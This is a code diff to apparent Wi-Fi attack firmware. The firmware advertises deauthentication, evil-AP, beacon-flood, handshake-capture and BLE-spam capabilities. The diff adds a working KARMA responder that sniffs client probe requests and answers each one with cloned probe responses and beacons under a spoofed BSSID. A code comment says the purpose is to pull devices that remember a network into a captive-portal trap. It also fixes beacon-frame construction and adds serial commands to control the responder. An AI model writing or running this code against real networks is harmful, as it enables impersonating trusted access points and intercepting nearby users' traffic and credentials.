@@ -766,7 +766,7 @@ static void tx_probe_req(const uint8_t* src, const char* ssid) {
 static const uint8_t TX_BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
 static int build_beacon_frame(uint8_t* f, const uint8_t* src, const uint8_t* dst,
-                              const char* ssid, uint8_t ftype) {
+                              const char* ssid, uint8_t ftype, int chan) {
   int n = 0;
   f[n++] = ftype; f[n++] = 0x00;                // frame control (0x80 beacon / 0x50 probe resp)
   f[n++] = 0x00; f[n++] = 0x00;                 // duration
@@ -777,12 +777,20 @@ static int build_beacon_frame(uint8_t* f, const uint8_t* src, const uint8_t* dst
   for(int i = 0; i < 8; i++) f[n++] = 0x00;     // timestamp
   f[n++] = 0x64; f[n++] = 0x00;                 // beacon interval
   f[n++] = 0x21; f[n++] = 0x00;                 // capability (ESS)
+  // The raw TX staging buffer is only TX_RAW_MAX_PAYLOAD bytes, so the SSID is what has to
+  // survive intact; the optional IEs are appended only while they still fit. The DS Parameter
+  // Set (our channel) is what makes the SSID appear in a normal scan list.
   int sl = ssid ? (int)strlen(ssid) : 0;
-  if(sl > 18) sl = 18;                          // keep the whole frame <= TX_RAW_MAX_PAYLOAD
+  if(sl > TX_RAW_MAX_PAYLOAD - 40) sl = TX_RAW_MAX_PAYLOAD - 40;
   f[n++] = 0x00; f[n++] = (uint8_t)sl;          // SSID IE
   for(int i = 0; i < sl; i++) f[n++] = (uint8_t)ssid[i];
-  f[n++] = 0x01; f[n++] = 0x04;                 // supported rates IE
-  f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8b; f[n++] = 0x96;
+  if(n + 6 <= TX_RAW_MAX_PAYLOAD) {             // supported rates IE
+    f[n++] = 0x01; f[n++] = 0x04;
+    f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8b; f[n++] = 0x96;
+  }
+  if(n + 3 <= TX_RAW_MAX_PAYLOAD) {             // DS parameter set = the channel we transmit on
+    f[n++] = 0x03; f[n++] = 0x01; f[n++] = (uint8_t)chan;
+  }
   return n;
 }
 
@@ -811,9 +819,72 @@ static int tx_raw_hex(const char* h) {
 static void tx_beacon_raw(const uint8_t* src, const uint8_t* dst, const char* ssid, uint8_t ftype, int chan) {
   if(chan < 1 || chan > 165) chan = 6;
   wext_set_channel(WLAN0_NAME, chan);
-  int n = build_beacon_frame(tx_stage, src, dst, ssid, ftype);
+  int n = build_beacon_frame(tx_stage, src, dst, ssid, ftype, chan);
   if(n > (int)sizeof(tx_stage)) n = (int)sizeof(tx_stage);
   if(n > 0) wifi_tx_raw_frame(tx_stage, n);
+}
+
+// --- B1: KARMA / known-beacon responder ---------------------------------------
+// Sniff probe requests (promiscuous) and answer every requested SSID with a probe response to the
+// requesting client plus a broadcast beacon, both cloning that SSID. The BSSID is derived from the
+// SSID so repeated probes keep mapping to the same fake AP. Devices that remember the network see
+// it again and can then be pulled into the captive portal (C1 = Trap). TX is deferred to loop():
+// the promisc callback runs in the WiFi task, so it only records the request there.
+static bool karma_on = false;
+static int karma_chan = 6;
+static volatile bool karma_pending = false;
+static char karma_ssid[33] = {0};
+static uint8_t karma_client[6] = {0};
+#define KARMA_SEEN_MAX 16
+static char karma_seen[KARMA_SEEN_MAX][33];
+static int karma_seen_n = 0;
+
+static void karma_note(const char* s) {
+  for(int i = 0; i < karma_seen_n; i++)
+    if(strcmp(karma_seen[i], s) == 0) return;
+  if(karma_seen_n < KARMA_SEEN_MAX) {
+    strncpy(karma_seen[karma_seen_n], s, 32);
+    karma_seen[karma_seen_n][32] = 0;
+    karma_seen_n++;
+  }
+}
+
+static void promisc_karma_cb(unsigned char* buf, unsigned int len, void* ud) {
+  (void)ud;
+  if(!karma_on || len < 24) return;
+  if(((buf[0] >> 2) & 3) != 0) return;    // management frames only
+  if(((buf[0] >> 4) & 0x0F) != 4) return; // subtype 4 = probe request
+  int p = 24;                             // probe requests have no fixed params before the IEs
+  while(p + 2 <= (int)len) {
+    int id = buf[p], l = buf[p + 1];
+    if(id == 0) {
+      if(l == 0 || l > 32 || p + 2 + l > (int)len) return;  // wildcard/empty or malformed
+      for(int i = 0; i < l; i++) {
+        uint8_t c = buf[p + 2 + i];
+        if(c < 32 || c > 126) return;     // only answer printable SSIDs
+      }
+      memcpy(karma_client, buf + 10, 6);  // addr2 = the probing client
+      memcpy(karma_ssid, buf + p + 2, l);
+      karma_ssid[l] = 0;
+      karma_note(karma_ssid);
+      karma_pending = true;
+      return;
+    }
+    p += 2 + l;
+  }
+}
+
+static void karma_respond(const char* ssid, const uint8_t* client, int chan) {
+  uint8_t bssid[6];
+  uint32_t h = 2166136261u;               // FNV-1a -> stable BSSID per SSID
+  for(const char* p = ssid; *p; p++) { h ^= (uint8_t)*p; h *= 16777619u; }
+  bssid[0] = 0x02;                        // locally administered
+  bssid[1] = (h >> 8) & 0xFF;
+  bssid[2] = (h >> 16) & 0xFF;
+  bssid[3] = (h >> 24) & 0xFF;
+  bssid[4] = 0x4B; bssid[5] = 0x4D;       // "KM"
+  tx_beacon_raw(bssid, client, ssid, 0x50, chan);   // probe response -> this client
+  tx_beacon_raw(bssid, TX_BCAST, ssid, 0x80, chan); // beacon -> passive scanners
 }
 
 // --- D2: BLE advert spam (Apple continuity + Microsoft Swift Pair) ---------------
@@ -1032,7 +1103,7 @@ static void pmkid_clientless(int ch, const uint8_t* bssid, const char* ssid) {
 // caps letters (5Ghost-compatible): D=deauth S=stascan E=evil/AP B=beacon H=handshake.
 // We advertise "DSEBH" (no BLE -> no L/I/C/K).
 #define DELFY_FW_VERSION "1.0.0"
-#define DELFY_FW_CAPS    "DSEBHLICK"
+#define DELFY_FW_CAPS    "DSEBHLICKR"
 
 // --- C: P3 multi-target deauth list (DEAUTHADD / DEAUTHRUN) -------------------
 #define DAUTH_MAX 8
@@ -1772,6 +1843,32 @@ void loop() {
       for(int i=0;i<secs;i++) delay(1000);
       wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
       probe_stream(ch);
+    }else if(readString.substring(0,9)=="KARMALIST"){
+      // B1: report the SSIDs the responder has seen, so the host can show them live.
+      // NOTE: this must be tested BEFORE the "KARMA" handler below - "KARMALIST" starts with
+      // "KARMA", so otherwise it gets swallowed and re-enables the responder on every poll.
+      String r = "KARMALIST:" + String((unsigned)karma_seen_n);
+      for(int i = 0; i < karma_seen_n; i++) r += String("|") + karma_seen[i];
+      Serial.println(r); Serial1.println(r);
+    }else if(readString.substring(0,5)=="KARMA"){
+      // B1: KARMA responder. Args: KARMA <0|1> [chan]
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int on = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 1;
+      int ch = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : karma_chan;
+      if(ch >= 1 && ch <= 165) karma_chan = ch;
+      karma_on = (on != 0);
+      karma_pending = false;
+      if(karma_on) {
+        if(apActive) destroyAP();
+        wext_set_channel(WLAN0_NAME, karma_chan);
+        wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_karma_cb, 0);
+      } else {
+        wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
+      }
+      String r = String("KARMA:") + (karma_on ? "on" : "off") + " ch=" + String(karma_chan) +
+                 " seen=" + String((unsigned)karma_seen_n);
+      Serial.println(r); Serial1.println(r);
     }else if(readString.substring(0,9)=="BEACONOFF"){
       // Stop every beacon/SSID-flood mode. Nothing else in the firmware turned all of them off
       // (SCAN cleared randomSSID/rickroll, STOP only ghostSpam), so a running flood could not be
@@ -2069,6 +2166,12 @@ void loop() {
     }
     digitalWrite(LED_R, LOW);
     delay(50);
+  }
+
+  // B1: answer a caught probe request (deferred out of the promisc callback).
+  if(karma_on && karma_pending) {
+    karma_pending = false;
+    if(karma_ssid[0]) karma_respond(karma_ssid, karma_client, karma_chan);
   }
 
   if (randomSSID){
